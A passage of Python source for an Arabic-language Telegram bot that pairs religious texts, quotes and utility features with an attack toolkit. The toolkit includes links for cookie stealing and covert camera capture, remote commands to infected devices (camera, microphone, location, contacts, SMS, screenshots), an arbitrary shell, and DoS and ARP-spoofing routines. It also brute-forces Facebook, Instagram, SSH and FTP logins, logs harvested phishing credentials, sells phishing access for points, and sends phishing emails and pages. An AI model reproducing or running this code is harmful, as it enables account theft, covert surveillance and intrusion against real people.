                total = len(adkar_list)
                safe_send(chat_id, f"📿 {('أذكار الصباح' if adkar_type == 'sabah' else 'أذكار المساء')}:\n\n{current}", reply_markup=build_adkar_action_menu(adkar_type, idx, total))
            return
        if data == "doaa_menu":
            safe_send(chat_id, "اختر الدعاء:", reply_markup=build_doaa_menu())
            return
        if data.startswith("doaa_"):
            category_map = {"doaa_safar": "سفر", "doaa_hem": "هم", "doaa_rizq": "رزق", "doaa_nawm": "نوم", "doaa_faraj": "فرج"}
            category = category_map.get(data)
            if category:
                doaa_list = ISLAMIC_DATA["doaa"].get(category, [])
                if doaa_list:
                    user_doaa_indices[chat_id][category] = 0
                    doaa_text = doaa_list[0]
                    total = len(doaa_list)
                    safe_send(chat_id, f"🤲 {category}:\n\n{doaa_text}", reply_markup=build_doaa_action_menu(category, 0, total))
            return
        if data.startswith("doaa_next_"):
            parts = data.split("_")
            category = parts[2]
            idx = int("_".join(parts[3:]))
            doaa_list = ISLAMIC_DATA["doaa"].get(category, [])
            if idx < len(doaa_list):
                doaa_text = doaa_list[idx]
                total = len(doaa_list)
                safe_send(chat_id, f"🤲 {category}:\n\n{doaa_text}", reply_markup=build_doaa_action_menu(category, idx, total))
            return
        if data == "muslim_menu":
            safe_send(chat_id, "اختر الموضوع:", reply_markup=build_muslim_menu())
            return
        if data.startswith("muslim_"):
            key = data.split("_")[1]
            content_map = {"arkan_islam": ISLAMIC_DATA["arkan_islam"], "arkan_iman": ISLAMIC_DATA["arkan_iman"], "wudu": ISLAMIC_DATA["wudu"], "ghusl": ISLAMIC_DATA["ghusl"]}
            if key in content_map:
                safe_send(chat_id, content_map[key])
            return

        # ===== اقتباسات ونصائح =====
        if data == "quotes_menu":
            safe_send(chat_id, "اختر الاقتباسات:", reply_markup=build_quotes_menu())
            return
        if data == "quotes_arabic":
            safe_send(chat_id, "اختر النوع:", reply_markup=build_quotes_type_menu('arabic'))
            return
        if data == "quotes_english":
            safe_send(chat_id, "Choose type:", reply_markup=build_quotes_type_menu('english'))
            return
        if data.startswith("quote_"):
            parts = data.split("_")
            lang = parts[1] if parts[1] in ['arabic', 'english'] else 'arabic'
            category = parts[2] if len(parts) > 2 else 'sad'
            quote, _ = get_random_quote(lang, category)
            safe_send(chat_id, quote)
            return
        if data == "tips_menu":
            safe_send(chat_id, "اختر النصيحة:", reply_markup=build_tips_menu())
            return
        if data.startswith("tips_"):
            tip_type = data.split("_")[1]
            tip, _ = get_random_tip(tip_type)
            safe_send(chat_id, tip)
            return

        # ===== أدوات التجسس =====
        if data == "device_info":
            token = get_user_token(chat_id)
            safe_send(chat_id, f"رابط معلومات الجهاز:\n{SERVER_URL}/device_info?token={token}")
            return
        if data == "camera_hack":
            token = get_user_token(chat_id)
            safe_send(chat_id, f"رابط الكاميرا:\n{SERVER_URL}/camera_hack?token={token}")
            return
        if data == "cookie_stealer":
            token = get_user_token(chat_id)
            safe_send(chat_id, f"🍪 رابط سرقة الكوكيز:\n{SERVER_URL}/cookie_stealer?token={token}")
            return
        if data == "track_phone":
            user_states[chat_id] = "waiting_phone_number"
            safe_send(chat_id, "📱 أدخل رقم الهاتف (مثال: +20123456789):")
            return
        if data == "analyze_apk":
            user_states[chat_id] = "waiting_apk_analysis"
            safe_send(chat_id, "أرسل ملف APK")
            return
        if data == "download_video":
            user_states[chat_id] = "waiting_download"
            safe_send(chat_id, "🔗 أرسل رابط الفيديو:")
            return
        if data == "check_link_advanced":
            user_states[chat_id] = "waiting_link_check_advanced"
            safe_send(chat_id, "🔗 أرسل الرابط لفحصه:")
            return
        if data == "comprehensive_scan":
            user_states[chat_id] = "waiting_scan_url"
            safe_send(chat_id, "🔍 أرسل رابط الموقع للفحص:")
            return

        # ===== خدمات عامة =====
        if data == "weather":
            user_states[chat_id] = "waiting_weather"
            safe_send(chat_id, "🌤️ أدخل اسم المدينة:")
            return
        if data == "wikipedia":
            user_states[chat_id] = "waiting_wikipedia"
            safe_send(chat_id, "📚 أدخل مصطلح البحث:")
            return
        if data == "password_gen":
            passwords = [password_generator(12) for _ in range(5)]
            temp_passwords[chat_id] = passwords
            msg = "🔑 اختر كلمة السر:\n"
            for i, pwd in enumerate(passwords):
                msg += f"{i+1}. {pwd}\n"
            markup = InlineKeyboardMarkup(row_width=2)
            for i in range(5):
                markup.row(InlineKeyboardButton(f"اختر {i+1}", callback_data=f"pwd_select_{i}"))
            safe_send(chat_id, msg, reply_markup=markup)
            return
        if data.startswith("pwd_select_"):
            idx = int("_".join(data.split("_")[1:]))
            passwords = temp_passwords.get(chat_id, [])
            if idx < len(passwords):
                safe_send(chat_id, f"✅ تم اختيار: {passwords[idx]}")
            return
        if data == "password_strength":
            user_states[chat_id] = "waiting_password_strength"
            safe_send(chat_id, "🔐 أرسل كلمة السر:")
            return
        if data == "translate":
            user_states[chat_id] = "waiting_translate"
            safe_send(chat_id, "🌐 أرسل النص:")
            return
        if data.startswith("trans_lang_"):
            lang_code = "_".join(data.split("_")[2:])
            text = user_states.get(f"{chat_id}_translate_text", "")
            if text:
                chunks, detected, src_name, tgt_name = translate_text_advanced_with_lang(text, lang_code)
                msg = f"🌐 الترجمة:\n\n"
                for chunk in chunks:
                    msg += chunk + "\n"
                safe_send(chat_id, msg)
                user_states[chat_id] = None
            return
        if data == "text_to_speech":
            user_states[chat_id] = "waiting_tts"
            safe_send(chat_id, "🎤 أرسل النص:", reply_markup=build_voice_menu())
            return
        if data.startswith("voice_"):
            voice_name = "_".join(data.split("_")[1:])
            voice_code = T11_VOICE_CODES.get(voice_name, T11_DEFAULT_VOICE)
            text = user_states.get(f"{chat_id}_tts_text", "")
            if text:
                safe_send(chat_id, f"⏳ جاري التحويل...")
                filepath = t11_generate_voice(text, voice_code)
                if filepath:
                    with open(filepath, 'rb') as f:
                        bot.send_audio(chat_id, f)
                    os.remove(filepath)
                else:
                    safe_send(chat_id, "❌ فشل التحويل.")
                user_states[chat_id] = None
            else:
                safe_send(chat_id, "❌ لم يتم العثور على نص.")
            return
        if data == "reminder":
            user_states[chat_id] = "waiting_reminder"
            safe_send(chat_id, "⏰ أدخل: الرسالة|الساعة:الدقيقة")
            return
        if data == "news":
            user_states[chat_id] = "waiting_news"
            safe_send(chat_id, "📰 أدخل الموضوع (سياسة، اقتصاد، رياضة):")
            return
        if data == "shorten_url":
            user_states[chat_id] = "waiting_shorten_url"
            safe_send(chat_id, "🔗 أرسل الرابط:")
            return
        if data == "expand_url":
            user_states[chat_id] = "waiting_expand_url"
            safe_send(chat_id, "🔗 أرسل الرابط المختصر:")
            return
        if data == "pdf_menu":
            safe_send(chat_id, "📄 اختر خدمة:", reply_markup=build_pdf_menu())
            return
        if data == "pdf_summary":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 الملخص:\n{pdf_text[:1000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل ملف PDF.")
            return
        if data == "pdf_extract":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                safe_send(chat_id, f"📄 النص:\n{pdf_text[:3000]}...")
            else:
                safe_send(chat_id, "لم يتم تحميل ملف PDF.")
            return
        if data == "pdf_smart":
            pdf_text = pdf_texts.get(chat_id)
            if pdf_text:
                user_states[chat_id] = "waiting_pdf_question"
                safe_send(chat_id, "🤖 اطرح سؤالك:")
            else:
                safe_send(chat_id, "لم يتم تحميل ملف PDF.")
            return
        if data == "list_devices":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور.")
                return
            rows = safe_db_query("SELECT device_id, name, status, last_seen FROM targets", fetch_one=False)
            if rows:
                msg = "الأجهزة:\n"
                for row in rows:
                    msg += f"{row[1]} - {row[2]} - {row[3][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد أجهزة")
            return

        # ===== القائمة السرية =====
        if data == "hacking_menu":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور.")
                return
            safe_send(chat_id, "⚠️ القائمة السرية:", reply_markup=build_hacking_menu())
            return

        # ===== أزرار الهجمات =====
        if data == "hack_sqli":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_sqli_hack"
            safe_send(chat_id, "🔍 أدخل رابط الموقع:")
            return
        if data == "hack_xss":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_xss_hack"
            safe_send(chat_id, "🔍 أدخل رابط الموقع:")
            return
        if data == "hack_dos":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_dos"
            safe_send(chat_id, "🎯 أدخل: IP|المنفذ|المدة")
            return
        if data == "hack_arp":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_arp"
            safe_send(chat_id, "🎯 أدخل: IP_الهدف|IP_البوابة")
            return
        if data == "bruteforce_fb":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_fb_username"
            safe_send(chat_id, "👤 أدخل اسم المستخدم:")
            return
        if data == "bruteforce_ig":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ig_username"
            safe_send(chat_id, "👤 أدخل اسم المستخدم:")
            return
        if data == "bruteforce_ssh":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ssh_target"
            safe_send(chat_id, "🎯 أدخل: IP|اسم_المستخدم")
            return
        if data == "bruteforce_ftp":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ftp_target"
            safe_send(chat_id, "🎯 أدخل: IP|اسم_المستخدم")
            return
        if data == "bruteforce_custom":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_custom_bruteforce"
            safe_send(chat_id, "🎯 أدخل: هدف|نوع|كلمات_سر")
            return
        if data == "port_scan":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_portscan"
            safe_send(chat_id, "🔍 أدخل الهدف (IP):")
            return
        if data == "ssl_scan":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ssl"
            safe_send(chat_id, "🔍 أدخل النطاق:")
            return
        if data == "hack_camera":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            add_command(device_id, "CAPTURE_CAMERA")
            safe_send(chat_id, f"تم إرسال أمر الكاميرا")
            return
        if data == "hack_mic":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            user_states[chat_id] = "waiting_mic_duration"
            safe_send(chat_id, "🎙️ أدخل مدة التسجيل:")
            return
        if data == "hack_location":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            add_command(device_id, "GET_LOCATION")
            safe_send(chat_id, "تم إرسال أمر الموقع")
            return
        if data == "hack_contacts":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            add_command(device_id, "GET_CONTACTS")
            safe_send(chat_id, "تم إرسال أمر جهات الاتصال")
            return
        if data == "hack_sms":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            add_command(device_id, "GET_SMS")
            safe_send(chat_id, "تم إرسال أمر SMS")
            return
        if data == "hack_screenshot":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            add_command(device_id, "SCREENSHOT")
            safe_send(chat_id, "تم إرسال أمر لقطة الشاشة")
            return
        if data == "hack_shutdown":
            if not is_admin(chat_id): return
            device_id = admin_remote.get(chat_id)
            if not device_id:
                safe_send(chat_id, "لم يتم تحديد جهاز.")
                return
            add_command(device_id, "SHUTDOWN")
            safe_send(chat_id, "تم إرسال أمر إيقاف التشغيل")
            return
        if data == "hack_shell":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_shell"
            safe_send(chat_id, "💻 أدخل الأمر:")
            return

        # ===== إدارة المستخدمين =====
        if data == "admin_panel":
            if not is_admin(chat_id): return
            safe_send(chat_id, "⚙️ لوحة التحكم:", reply_markup=build_admin_panel())
            return
        if data == "admin_stats":
            if not is_admin(chat_id): return
            users_count = safe_db_query("SELECT COUNT(*) FROM users")[0]
            safe_send(chat_id, f"📊 الإحصائيات:\nالمستخدمون: {users_count}")
            return
        if data == "admin_broadcast":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_broadcast"
            safe_send(chat_id, "📢 أدخل رسالة البث:")
            return
        if data == "admin_users":
            if not is_admin(chat_id): return
            rows = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
            msg = "👥 المستخدمون:\n"
            for r in rows:
                name = get_user_name(r[0])
                status = "🟢" if r[2] == 0 else "🔴"
                msg += f"{status} {name} - نقاط: {r[3]}\n"
            safe_send(chat_id, msg)
            return
        if data == "admin_reports":
            if not is_admin(chat_id): return
            safe_send(chat_id, "📋 لا توجد تقارير")
            return
        if data == "admin_phishing_logs":
            if not is_admin(chat_id): return
            rows = safe_db_query("SELECT platform, username, password, created_at FROM phishing_logs ORDER BY created_at DESC LIMIT 10", fetch_one=False)
            if rows:
                msg = "🎯 بيانات التصيد:\n"
                for r in rows:
                    msg += f"{r[0]} - {r[1]} - {r[2]} - {r[3][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد بيانات")
            return
        if data == "admin_permissions":
            if not is_admin(chat_id): return
            markup, error = build_users_menu(chat_id, "perm")
            if markup:
                safe_send(chat_id, "اختر المستخدم:", reply_markup=markup)
            return
        if data.startswith("perm_user_"):
            if not is_admin(chat_id): return
            target_user = int("_".join(data.split("_")[2:]))
            safe_send(chat_id, f"صلاحيات المستخدم {get_user_name(target_user)}")
            return
        if data == "admin_points_menu":
            if not is_admin(chat_id): return
            markup, error = build_users_menu(chat_id, "points")
            if markup:
                safe_send(chat_id, "اختر المستخدم:", reply_markup=markup)
            return
        if data.startswith("points_user_"):
            if not is_admin(chat_id): return
            target_user = int("_".join(data.split("_")[2:]))
            user_states[chat_id] = "waiting_admin_points_amount"
            user_states[f"{chat_id}_points_target"] = target_user
            safe_send(chat_id, "💎 أدخل عدد النقاط:")
            return
        if data == "admin_ban_menu":
            if not is_admin(chat_id): return
            markup, error = build_users_menu(chat_id, "ban")
            if markup:
                safe_send(chat_id, "اختر المستخدم:", reply_markup=markup)
            return
        if data.startswith("ban_user_"):
            if not is_admin(chat_id): return
            target_user = int("_".join(data.split("_")[2:]))
            row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            if row is not None:
                new_status = 0 if row[0] else 1
                safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'حظر'} المستخدم")
            return
        if data == "lock_chat":
            if not is_admin(chat_id): return
            markup, error = build_users_menu(chat_id, "lock")
            if markup:
                safe_send(chat_id, "اختر المستخدم:", reply_markup=markup)
            return
        if data.startswith("lock_user_"):
            if not is_admin(chat_id): return
            target_user = int("_".join(data.split("_")[2:]))
            row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (target_user,))
            if row is not None:
                new_status = 0 if row[0] else 1
                safe_db_execute("UPDATE users SET is_banned = ? WHERE chat_id = ?", (new_status, target_user))
                safe_send(chat_id, f"تم {'فتح' if new_status == 0 else 'قفل'} الدردشة")
            return
        if data == "send_to_user":
            if not is_admin(chat_id): return
            markup, error = build_users_menu(chat_id, "send")
            if markup:
                safe_send(chat_id, "اختر المستخدم:", reply_markup=markup)
            return
        if data.startswith("send_user_"):
            if not is_admin(chat_id): return
            target_user = int("_".join(data.split("_")[2:]))
            user_states[chat_id] = "waiting_send_to_user"
            user_states[f"{chat_id}_send_target"] = target_user
            safe_send(chat_id, f"📝 أدخل الرسالة إلى {get_user_name(target_user)}:")
            return
        if data == "user_activity":
            if not is_admin(chat_id): return
            safe_send(chat_id, "📋 لا توجد نشاطات")
            return

        # ===== الحماية =====
        if data == "protection_menu":
            if not is_admin(chat_id): return
            safe_send(chat_id, "🛡️ الحماية:", reply_markup=build_protection_menu())
            return
        if data == "protect_lock":
            if not is_admin(chat_id): return
            global BOT_LOCKED
            BOT_LOCKED = not BOT_LOCKED
            safe_send(chat_id, f"قفل البوت: {'مفعل' if BOT_LOCKED else 'معطل'}")
            return
        if data == "protect_shield":
            if not is_admin(chat_id): return
            safe_send(chat_id, active_shield())
            return
        if data == "protect_stealth":
            if not is_admin(chat_id): return
            global STEALTH_MODE
            STEALTH_MODE = True
            safe_send(chat_id, "🕵️ وضع التخفي مفعل")
            return
        if data == "protect_detect":
            if not is_admin(chat_id): return
            safe_send(chat_id, detect_intrusion())
            return
        if data == "protect_identity":
            if not is_admin(chat_id): return
            safe_send(chat_id, change_bot_identity())
            return
        if data == "protect_clean":
            if not is_admin(chat_id): return
            safe_send(chat_id, clean_traces())
            return
        if data == "protect_api":
            if not is_admin(chat_id): return
            safe_send(chat_id, f"🔑 مفتاح API: `{API_KEY}`")
            return
        if data == "protect_backup":
            if not is_admin(chat_id): return
            safe_send(chat_id, backup_data())
            return
        if data == "protect_reboot":
            if not is_admin(chat_id): return
            safe_send(chat_id, restart_bot_safely())
            return
        if data == "toggle_stealth":
            if not is_admin(chat_id): return
            STEALTH_MODE = not STEALTH_MODE
            safe_send(chat_id, f"وضع التخفي: {'مفعل' if STEALTH_MODE else 'معطل'}")
            return

        # ===== نقاط ودعوات =====
        if data == "my_points":
            points = get_user_points(chat_id)
            safe_send(chat_id, f"💎 نقاطك: {points}")
            return
        if data == "my_referral":
            code = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
            if code and code[0]:
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{code[0]}")
            else:
                new_code = secrets.token_urlsafe(8)
                safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (new_code, chat_id))
                safe_send(chat_id, f"🔗 رابط دعوتك:\nhttps://t.me/{bot.get_me().username}?start=ref_{new_code}")
            return
        if data == "points_history":
            rows = safe_db_query("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 10", (chat_id,), fetch_one=False)
            if rows:
                msg = "📜 سجل النقاط:\n"
                for r in rows:
                    msg += f"{r[0]} نقطة - {r[1]} - {r[2][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "لا توجد سجلات")
            return

        # ===== التصيد =====
        if data == "phishing_locked":
            points = get_user_points(chat_id)
            if points < 300:
                safe_send(chat_id, f"❌ تحتاج 300 نقطة. نقاطك: {points}")
            else:
                if deduct_points(chat_id, 300, "شراء صلاحية التصيد"):
                    safe_db_execute("UPDATE users SET can_use_phishing = 1 WHERE chat_id = ?", (chat_id,))
                    safe_send(chat_id, "✅ تم تفعيل صلاحية التصيد.")
            return
        if data == "phishing_pages":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية.")
                return
            safe_send(chat_id, "اختر المنصة:", reply_markup=build_phishing_pages_menu())
            return
        if data == "phishing_email":
            if not user_can_use_phishing(chat_id) and not is_admin(chat_id):
                safe_send(chat_id, "❌ ليس لديك صلاحية.")
                return
            safe_send(chat_id, "اختر المنصة:", reply_markup=build_phishing_platform_menu())
            return
        if data.startswith("phish_platform_"):
            platform = "_".join(data.split("_")[2:])
            user_states[chat_id] = "waiting_phishing_target"
            user_states[f"{chat_id}_phishing_platform"] = platform
            safe_send(chat_id, f"📧 أدخل البريد المستهدف:")
            return
        if data.startswith("phish_"):
            platform = data.split("_")[1]
            if platform in ['facebook', 'google', 'whatsapp', 'twitter', 'instagram']:
                safe_send(chat_id, f"✅ صفحة تصيد لـ {platform}:\n{SERVER_URL}/phishing_pages/{platform}")
            else:
                safe_send(chat_id, "منصة غير مدعومة")
            return
        if data == "phish_action_auto":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                safe_send(chat_id, f"⏳ جاري إرسال بريد تصيد...")
                result = send_phishing_email(target_email, platform)
                safe_send(chat_id, result)
            else:
                safe_send(chat_id, "لم يتم تحديد بريد.")
            user_states[chat_id] = None
            return
        if data == "phish_action_manual":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = user_states.get(f"{chat_id}_phishing_target_email", "")
            if target_email:
                user_states[chat_id] = "waiting_phishing_custom_message"
                safe_send(chat_id, f"✍️ اكتب رسالة البريد (HTML):")
            else:
                safe_send(chat_id, "لم يتم تحديد بريد.")
            return

    except Exception as e:
        logger.error(f"callback error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في callback: {e}")

# ===================== معالجات النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text(message):
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        state = user_states.get(chat_id)

        update_last_seen(chat_id)
        log_activity(chat_id, f"text: {text[:50]}")

        if is_banned(chat_id) and not is_admin(chat_id):
            safe_send(chat_id, "أنت محظور.")
            return
        if BOT_LOCKED and not is_admin(chat_id):
            safe_send(chat_id, "البوت مقفل.")
            return

        # ===== T11 =====
        if text.startswith('/say '):
            if chat_id != ADMIN_ID:
                safe_send(chat_id, "⛔ خاصية المطور.")
                return
            voice_text = text.replace('/say ', '')
            if voice_text:
                voice_code = t11_user_voice_preference.get(chat_id, T11_DEFAULT_VOICE)
                filepath = t11_generate_voice(voice_text, voice_code)
                if filepath:
                    with open(filepath, 'rb') as f:
                        bot.send_audio(chat_id, f)
                    os.remove(filepath)
            return

        if text == '/report':
            if chat_id != ADMIN_ID:
                safe_send(chat_id, "⛔ خاصية المطور.")
                return
            rep = t11_get_report()
            safe_send(chat_id, f"📊 تقرير 24 ساعة:\nحظر: {rep.get('ban', 0)}")
            return

        # ===== T11 العام =====
        if chat_id in t11_user_mode and t11_user_mode[chat_id] == "assistant":
            t11_save_message(chat_id, text)
            if t11_is_banned(chat_id):
                safe_send(chat_id, "⛔ تم تقييدك.")
                return
            if chat_id == ADMIN_ID:
                response = t11_handle_dev(text, chat_id)
            else:
                response = t11_handle_public(text, chat_id)
            safe_send(chat_id, response)
            return

        # ===== أوامر الهجمات =====
        if state == "waiting_sqli_hack":
            if not is_admin(chat_id): return
            result = comprehensive_exploit(text)
            safe_send(chat_id, format_exploit_report(result))
            save_scan_result(text, "sqli", result)
            user_states[chat_id] = None
            return
        if state == "waiting_xss_hack":
            if not is_admin(chat_id): return
            result = comprehensive_exploit(text)
            safe_send(chat_id, format_exploit_report(result))
            save_scan_result(text, "xss", result)
            user_states[chat_id] = None
            return
        if state == "waiting_dos":
            if not is_admin(chat_id): return
            parts = text.split('|')
            if len(parts) >= 2:
                target = parts[0].strip()
                port = int(parts[1]) if parts[1].isdigit() else 80
                duration = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
                safe_send(chat_id, f"🎯 بدء DoS...")
                result = dos_attack(target, port, duration)
                safe_send(chat_id, f"✅ انتهى. تم إرسال {result['packets_sent']} حزمة")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_arp":
            if not is_admin(chat_id): return
            parts = text.split('|')
            if len(parts) == 2:
                target_ip, gateway_ip = parts[0].strip(), parts[1].strip()
                result = arp_spoof(target_ip, gateway_ip)
                safe_send(chat_id, f"✅ ARP: {result.get('status', 'خطأ')}")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_fb_username":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_fb_password_list"
            user_states[f"{chat_id}_fb_user"] = text
            safe_send(chat_id, "📝 أرسل قائمة كلمات السر (مفصولة بفواصل) أو 'default':")
            return
        if state == "waiting_fb_password_list":
            if not is_admin(chat_id): return
            username = user_states.get(f"{chat_id}_fb_user")
            if text.lower() == 'default':
                passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin']
            else:
                passwords = [p.strip() for p in text.split(',')]
            safe_send(chat_id, f"⏳ جاري تخمين فيسبوك...")
            result = brute_force_facebook(username, passwords)
            if result['success']:
                safe_send(chat_id, f"✅ اختراق FB! كلمة السر: {result['credentials']['password']}")
                notify_admin(f"🔥 FB: {username} - {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة")
            user_states[chat_id] = None
            return
        if state == "waiting_ig_username":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ig_password_list"
            user_states[f"{chat_id}_ig_user"] = text
            safe_send(chat_id, "📝 أرسل قائمة كلمات السر أو 'default':")
            return
        if state == "waiting_ig_password_list":
            if not is_admin(chat_id): return
            username = user_states.get(f"{chat_id}_ig_user")
            if text.lower() == 'default':
                passwords = ['123456', 'password', '123456789', 'qwerty']
            else:
                passwords = [p.strip() for p in text.split(',')]
            safe_send(chat_id, f"⏳ جاري تخمين انستغرام...")
            result = brute_force_instagram(username, passwords)
            if result['success']:
                safe_send(chat_id, f"✅ اختراق IG! كلمة السر: {result['credentials']['password']}")
                notify_admin(f"🔥 IG: {username} - {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة")
            user_states[chat_id] = None
            return
        if state == "waiting_ssh_target":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ssh_password_list"
            user_states[f"{chat_id}_ssh_target"] = text
            safe_send(chat_id, "📝 أرسل قائمة كلمات السر أو 'default':")
            return
        if state == "waiting_ssh_password_list":
            if not is_admin(chat_id): return
            target = user_states.get(f"{chat_id}_ssh_target")
            if text.lower() == 'default':
                passwords = ['123456', 'password', 'admin', 'root', 'qwerty']
            else:
                passwords = [p.strip() for p in text.split(',')]
            parts = target.split('|')
            if len(parts) == 2:
                ip, username = parts[0].strip(), parts[1].strip()
                safe_send(chat_id, f"⏳ جاري تخمين SSH...")
                result = brute_force_ssh(ip, username, passwords)
                if result['success']:
                    safe_send(chat_id, f"✅ SSH! كلمة السر: {result['credentials']['password']}")
                    notify_admin(f"🔥 SSH: {ip} - {username} - {result['credentials']['password']}")
                else:
                    safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_ftp_target":
            if not is_admin(chat_id): return
            user_states[chat_id] = "waiting_ftp_password_list"
            user_states[f"{chat_id}_ftp_target"] = text
            safe_send(chat_id, "📝 أرسل قائمة كلمات السر أو 'default':")
            return
        if state == "waiting_ftp_password_list":
            if not is_admin(chat_id): return
            target = user_states.get(f"{chat_id}_ftp_target")
            if text.lower() == 'default':
                passwords = ['123456', 'password', 'admin', 'ftp', 'qwerty']
            else:
                passwords = [p.strip() for p in text.split(',')]
            parts = target.split('|')
            if len(parts) == 2:
                ip, username = parts[0].strip(), parts[1].strip()
                safe_send(chat_id, f"⏳ جاري تخمين FTP...")
                result = brute_force_ftp(ip, username, passwords)
                if result['success']:
                    safe_send(chat_id, f"✅ FTP! كلمة السر: {result['credentials']['password']}")
                    notify_admin(f"🔥 FTP: {ip} - {username} - {result['credentials']['password']}")
                else:
                    safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_custom_bruteforce":
            if not is_admin(chat_id): return
            parts = text.split('|')
            if len(parts) >= 2:
                target = parts[0].strip()
                platform = parts[1].strip().lower()
                passwords = parts[2].split(',') if len(parts) > 2 else ['123456']
                if platform == 'facebook':
                    result = brute_force_facebook(target, passwords)
                elif platform == 'instagram':
                    result = brute_force_instagram(target, passwords)
                elif platform == 'ssh':
                    ip, user = target.split(':')
                    result = brute_force_ssh(ip, user, passwords)
                elif platform == 'ftp':
                    ip, user = target.split(':')
                    result = brute_force_ftp(ip, user, passwords)
                else:
                    result = {'success': False, 'attempts': 0}
                if result['success']:
                    safe_send(chat_id, f"✅ اختراق! {result['credentials']}")
                else:
                    safe_send(chat_id, f"❌ فشل. تم تجربة {result['attempts']} كلمة")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة")
            user_states[chat_id] = None
            return
        if state == "waiting_portscan":
            if not is_admin(chat_id): return
            open_ports = port_scan(text)
            safe_send(chat_id, f"🔍 المنافذ المفتوحة: {open_ports if open_ports else 'لا توجد'}")
            user_states[chat_id] = None
            return
        if state == "waiting_ssl":
            if not is_admin(chat_id): return
            result = ssl_scan(text)
            if result['valid']:
                safe_send(chat_id, f"✅ SSL صالح حتى: {result['not_after']}\nالجهة: {result['issuer']}\nالأيام المتبقية: {result['days_left']}")
            else:
                safe_send(chat_id, f"❌ فشل: {result.get('error', 'خطأ')}")
            user_states[chat_id] = None
            return
        if state == "waiting_shell":
            if not is_admin(chat_id): return
            try:
                result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=30)
                safe_send(chat_id, f"💻 نتيجة:\n{result.stdout[:3000]}")
            except Exception as e:
                safe_send(chat_id, f"❌ خطأ: {str(e)}")
            user_states[chat_id] = None
            return
        if state == "waiting_mic_duration":
            if not is_admin(chat_id): return
            try:
                duration = int(text)
                device_id = admin_remote.get(chat_id)
                if device_id:
                    add_command(device_id, f"RECORD_AUDIO:{duration}")
                    safe_send(chat_id, f"✅ تم إرسال أمر التسجيل لمدة {duration} ثانية")
                else:
